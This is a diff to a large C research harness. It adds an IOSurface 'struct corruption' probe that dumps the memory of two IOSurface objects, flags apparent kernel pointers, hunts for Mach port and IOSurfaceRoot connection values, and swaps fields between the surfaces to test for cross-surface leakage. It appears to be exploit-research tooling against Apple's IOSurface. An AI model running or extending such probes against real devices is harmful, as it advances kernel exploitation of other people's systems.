@@ -16979,6 +16979,187 @@ static void *r445_thread_fn(void *arg) {
 }
 
 
+static void r454_probe(void) {
+    rlog("\n=== r454: IOSurfaceRef struct corruption + kernel trap analysis ===\n\n");
+    fflush(stdout);
+
+    CFMutableDictionaryRef pa = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfacePixelFormat"), pfn);
+    IOSurfaceRef surfA = IOSurfaceCreate(pa);
+    CFRelease(pa); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+    if (!surfA) { rlog("FAIL: surfA\n"); return; }
+    uint32_t sidA = IOSurfaceGetID(surfA);
+    rlog("  surfA SID=%u ptr=%p\n", sidA, surfA);
+
+    pa = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfacePixelFormat"), pfn);
+    IOSurfaceRef surfB = IOSurfaceCreate(pa);
+    CFRelease(pa); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+    if (!surfB) { rlog("FAIL: surfB\n"); CFRelease(surfA); return; }
+    uint32_t sidB = IOSurfaceGetID(surfB);
+    rlog("  surfB SID=%u ptr=%p\n", sidB, surfB);
+
+    /* --- Full 384-byte dump comparing both structs --- */
+    rlog("\n  --- IOSurfaceRef struct comparison (A vs B) ---\n");
+    uint64_t *pA = (uint64_t *)surfA;
+    uint64_t *pB = (uint64_t *)surfB;
+    for (int i = 0; i < 48; i++) {
+        uint64_t va = pA[i], vb = pB[i];
+        int diff = (va != vb);
+        int is_kptr_a = ((va >> 48) == 0xffff || (va >> 48) == 0xfffe) && va != 0xFFFFFFFFFFFFFFFFULL;
+        rlog("    +%3d: A=0x%016llx  B=0x%016llx  %s%s\n", i * 8,
+             (unsigned long long)va, (unsigned long long)vb,
+             diff ? "DIFF" : "same",
+             is_kptr_a ? " KPTR?" : "");
+    }
+
+    /* --- Find mach ports (small odd multiples of 4+3: 0x103, 0x203...) --- */
+    rlog("\n  --- Mach port search ---\n");
+    uint32_t *p32A = (uint32_t *)surfA;
+    for (int i = 0; i < 20; i++) {
+        uint32_t v = p32A[i];
+        if (v > 0 && v < 0x10000 && (v & 3) == 3) {
+            rlog("    surfA+%d (32b): 0x%08x — mach_port_t candidate\n", i * 4, v);
+        }
+    }
+
+    /* --- Find the io_connect_t by opening IOSurfaceRoot ourselves --- */
+    rlog("\n  --- IOSurfaceRoot connection analysis ---\n");
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    rlog("    IOSurfaceRoot service: 0x%x\n", svc);
+    uint32_t my_conn = 0;
+    if (svc) {
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        rlog("    IOServiceOpen: kr=0x%x conn=0x%x\n", kr, conn);
+        my_conn = conn;
+
+        if (kr == KERN_SUCCESS) {
+            /* Search for this connection in surfA */
+            uint32_t *scan = (uint32_t *)surfA;
+            rlog("    Searching surfA for conn=0x%x:\n", conn);
+            for (int i = 0; i < 96; i++) {
+                if (scan[i] == conn) {
+                    rlog("      *** Found at surfA+%d ***\n", i * 4);
+                }
+            }
+            /* Also search for the service port */
+            for (int i = 0; i < 96; i++) {
+                if (scan[i] == svc) {
+                    rlog("      Found service port 0x%x at surfA+%d\n", svc, i * 4);
+                }
+            }
+            IOServiceClose(conn);
+        }
+        IOObjectRelease(svc);
+    }
+
+    /* --- Connection swap test: swap diverging fields between A and B --- */
+    rlog("\n  --- Connection swap test ---\n");
+    {
+        uint8_t secret_b[16];
+        memset(secret_b, 0xBB, sizeof(secret_b));
+        CFDataRef sd = CFDataCreate(NULL, secret_b, sizeof(secret_b));
+        IOSurfaceSetValue(surfB, CFSTR("secret_key"), sd);
+        CFRelease(sd);
+
+        uint32_t *s32A = (uint32_t *)surfA;
+        uint32_t *s32B = (uint32_t *)surfB;
+        int div_count = 0;
+        int div_offsets[64];
+        for (int i = 0; i < 96; i++) {
+            if (s32A[i] != s32B[i]) {
+                if (div_count < 64) div_offsets[div_count++] = i;
+            }
+        }
+        rlog("    %d diverging 32-bit fields found\n", div_count);
+
+        for (int d = 0; d < div_count && d < 15; d++) {
+            int idx = div_offsets[d];
+            uint32_t origA = s32A[idx];
+            uint32_t origB = s32B[idx];
+
+            s32A[idx] = origB;
+
+            char key[32];
+            snprintf(key, sizeof(key), "xtest_%d", idx);
+            CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII);
+            uint8_t td[8] = {0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD};
+            CFDataRef dd = CFDataCreate(NULL, td, sizeof(td));
+            IOSurfaceSetValue(surfA, ks, dd);
+            CFRelease(dd);
+
+            s32A[idx] = origA;
+
+            CFTypeRef bval = IOSurfaceCopyValue(surfB, ks);
+            CFTypeRef aval = IOSurfaceCopyValue(surfA, ks);
+            rlog("    offset +%3d: A=0x%08x→B=0x%08x | surfA=%s surfB=%s%s\n",
+                 idx * 4, origA, origB,
+                 aval ? "has" : "no",
+                 bval ? "HAS" : "no",
+                 bval ? " *** CROSS-SURFACE ***" : "");
+            if (bval) CFRelease(bval);
+            if (aval) CFRelease(aval);
+            CFRelease(ks);
+        }
+
+        /* Also try swapping full 64-bit words at key offsets */
+        rlog("\n    64-bit word swap test at KPTR offsets:\n");
+        int kptr_offsets[] = {4, 21, 22, 35, 36}; /* +32, +168, +176, +280, +288 from r453 */
+        for (int k = 0; k < 5; k++) {
+            int idx = kptr_offsets[k];
+            uint64_t origA = pA[idx];
+            uint64_t origB = pB[idx];
+            if (origA == origB) {
+                rlog("    +%d: same value, skip\n", idx * 8);
+                continue;
+            }
+
+            pA[idx] = origB;
+
+            char key[32];
+            snprintf(key, sizeof(key), "kswap_%d", idx);
+            CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII);
+            uint8_t td[8] = {0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE};
+            CFDataRef dd = CFDataCreate(NULL, td, sizeof(td));
+            IOSurfaceSetValue(surfA, ks, dd);
+            CFRelease(dd);
+
+            pA[idx] = origA;
+
+            CFTypeRef bval = IOSurfaceCopyValue(surfB, ks);
+            rlog("    +%3d: A=0x%llx→B=0x%llx | surfB=%s%s\n",
+                 idx * 8, (unsigned long long)origA, (unsigned long long)origB,
+                 bval ? "HAS" : "no",
+                 bval ? " *** CROSS-SURFACE ***" : "");
+            if (bval) CFRelease(bval);
+            CFRelease(ks);
+        }
+    }
+
+    CFRelease(surfA);
+    CFRelease(surfB);
+    rlog("\n=== r454 complete ===\n");
+}
+
 static void r453_shared_mem(void) {
     rlog("\n=== r453_shared_mem: IOSurface shared mem exploitation analysis ===\n\n");
     fflush(stdout);
@@ -82078,6 +82259,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 458) {
+            rlog("*** rounds=458: IOSurfaceRef struct corruption + connection swap ***\n\n");
+            fflush(stdout);
+            r454_probe();
+            goto done;
+        }
         if (rounds == 457) {
             rlog("*** rounds=457: IOSurface shared mem exploitation analysis ***\n\n");
             fflush(stdout);
@@ -84846,7 +85033,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
